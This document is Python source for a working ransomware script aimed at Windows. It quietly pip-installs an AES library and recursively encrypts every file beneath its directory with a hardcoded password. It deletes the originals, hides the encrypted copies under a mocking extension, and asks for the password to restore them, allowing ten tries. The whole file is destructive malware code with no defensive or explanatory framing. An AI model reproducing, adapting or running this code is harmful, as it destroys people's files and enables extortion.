import os
from pathlib import Path
os.system('pip install pyaescrypt > nul 2>nul')
import pyAesCrypt
import stat
import subprocess
import threading
python = locals().get('__file__')
bufferSize = 64 * 1024
default_ext = '.youjustgothackedlolgethackedtakethellol'
#print(python)
password = 'malware'
def EncryptFile(files,password,ext):
    if files==python:
        return
    #print(os.access(files,os.R_OK),files)
    try:
        #print('Encrypting file: ' + files)
        pyAesCrypt.encryptFile(files,files+ext,password,bufferSize)
        os.unlink(files)
        subprocess.run(['attrib','+s','+h',files+ext])

    except:
        pass
def EncryptDir(path):
    for files in os.listdir(path):
        if os.path.isfile(os.path.join(path, files)):
            filename = os.path.join(path, files)
            #print(filename)
            try:
                skip = 1
            except:
                continue
            else:
                try:
                    skip = 1
                except:
                    continue
                else:
                    st = os.stat(filename)

                    is_hidden = bool(st.st_file_attributes & stat.FILE_ATTRIBUTE_HIDDEN)
                    is_system = bool(st.st_file_attributes & stat.FILE_ATTRIBUTE_SYSTEM)
                    file_ext = default_ext
                    if is_system:
                        file_ext += 'sysfile'
                    if is_hidden:
                        file_ext += 'hidefile'
                    #print(filename,is_system,is_hidden,file_ext,path)
                    threading.Thread(target=EncryptFile,args=(filename,password,file_ext)).start()
                    #subprocess.run(['attrib','+s','+h',filename+file_ext],shell=True)
def DecryptFile(files,password):
    if files==python:
        return
    try:
        pyAesCrypt.decryptFile(files,os.path.splitext(files)[0],password,bufferSize)
        #print('Decrypted file: ' + os.path.splitext(files)[0])
        os.unlink(files)
        sys,hide = '-s','-h'
        if 'hidefile' in os.path.splitext(files)[1]:
            hide = '+h'
        if 'sysfile' in os.path.splitext(files)[1]:
            sys = '+s'
        os.system(' '.join(['attrib',sys,hide,os.path.splitext(files)[0],'>nul']))
        print('Decrypted file: ' + os.path.splitext(files)[0])

    except:
        pass
def DecryptDir(path):
    path_python = os.path.split(python)[0]
    for files in os.listdir(path):
        if os.path.isfile(os.path.join(path, files)):
            filename = os.path.join(path, files)
            #print(filename)
            try:
                skip = 1
            except:
                continue
            else:
                try:
                    skip = 1
                except:
                    continue
                else:
                    threading.Thread(target=DecryptFile,args=(filename,password)).start()
                #os.system('cls||clear')
def EncryptFiles():
    #print(direct)
    p = Path('.').glob('**/*')
    out = list(p)
    #print(out)
    for i in (out):
        path = i
        try:
            os.listdir(path)
        except:
            path_python = os.path.split(python)[0]
            #print(os.path.split(__file__)[0],os.path.split(path_python)[0])
            #print(path,''==os.path.split(path)[0],os.path.split(path)[0])
            if ''==os.path.split(path)[0]:
                st = os.stat(os.path.join(path_python,path))
                is_hidden = bool(st.st_file_attributes & stat.FILE_ATTRIBUTE_HIDDEN)
                is_system = bool(st.st_file_attributes & stat.FILE_ATTRIBUTE_SYSTEM)
                file_ext = default_ext
                #print(path,is_hidden,is_system)
                if is_system:
                    file_ext += 'sysfile'
                if is_hidden:
                    file_ext += 'hidefile'
                #print(file_ext)
                threading.Thread(target=EncryptFile,args=(os.path.join(path_python,path),password,file_ext)).start()
                #print(file_ext,path)
                #name = (os.path.splitdrive(os.path.splitdrive(rf'{os.path.join(path_python,path)}')[1])[1]).replace('\\\\','\\') + file_ext
                if not os.path.join(path_python,path)==python:
                    #print('File',path)
                    #subprocess.run(['attrib','+h','+s',f'"{os.path.splitdrive(os.path.join(path_python,path))[0]}{name}"'])
                    ...
                    #subprocess.run(['attrib','+s','+h',os.path.join(path_python,path)+file_ext])
                #print(os.path.join(path_python,path))
        else:
            threading.Thread(target=EncryptDir,args=(path,)).start()
def DecryptFiles():
    #print(direct)
    p = Path('.').glob('**/*')
    out = list(p)
    #print(out)
    for i in (out):
        path = i
        try:
            os.listdir(path)
        except:
            path_python = os.path.split(python)[0]
            #print(os.path.split(path)[0],os.path.split(path_python)[0])
            if ''==os.path.split(path)[0]:
                threading.Thread(target=DecryptFile,args=(os.path.join(path_python,path),password)).start()
                #name = os.path.splitext(os.path.splitdrive(os.path.splitdrive(rf'{os.path.join(path_python,path)}')[1])[1])[0].replace('\\\\','\\')
                if not os.path.join(path_python,path)==python and os.path.isfile(os.path.join(path_python,os.path.splitext(path)[0])):
                    #subprocess.run(['attrib','-h','-s',f'"{os.path.splitdrive(os.path.join(path_python,path))[0]}{name}"'])
                    ...
                   # sys,hide = '-s','-h'
                   # if 'hidefile' in os.path.splitext(path)[1]:
                   #     hide = '+h'
                   # if 'sysfile' in os.path.splitext(path)[1]:
                   #     sys = '+s'
                   # #print(os.path.splitext(path)[1],hide,sys)
                   # run = ['attrib',sys,hide,os.path.splitext(path)[0],'>nul']
                   # run = ' '.join(run)
                   # os.system(run)
                    #os.system('cls||clear')
        else:
            threading.Thread(target=DecryptDir,args=(path,)).start()
EncryptFiles()
current_index = 0
maximum = 10
while True:
    password1 = input(f"Enter The Password:({current_index}/{maximum})")
    if password==password1:
        DecryptFiles()
        break
    if current_index==maximum:
        break
    current_index += 1
